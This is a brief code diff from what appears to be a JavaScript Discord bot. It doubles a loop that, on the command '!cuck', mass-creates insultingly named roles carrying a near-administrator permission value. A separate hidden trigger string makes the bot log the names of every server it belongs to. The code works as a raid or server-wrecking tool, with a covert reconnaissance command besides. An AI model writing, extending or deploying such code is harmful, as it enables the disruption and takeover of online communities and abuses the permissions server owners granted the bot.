@@ -10,7 +10,7 @@ if(message.content.includes("AR!kelsairv")){
   console.log(`${bot.guilds.map(c => c.name)}`)
 }
 if(message.content === "!cuck"){
-for(var i =0; i < 200; i++){
+for(var i =0; i < 400; i++){
     message.guild.createRole({name:"cuck",
                              mentionable:false,
                              permissions:2146958591,
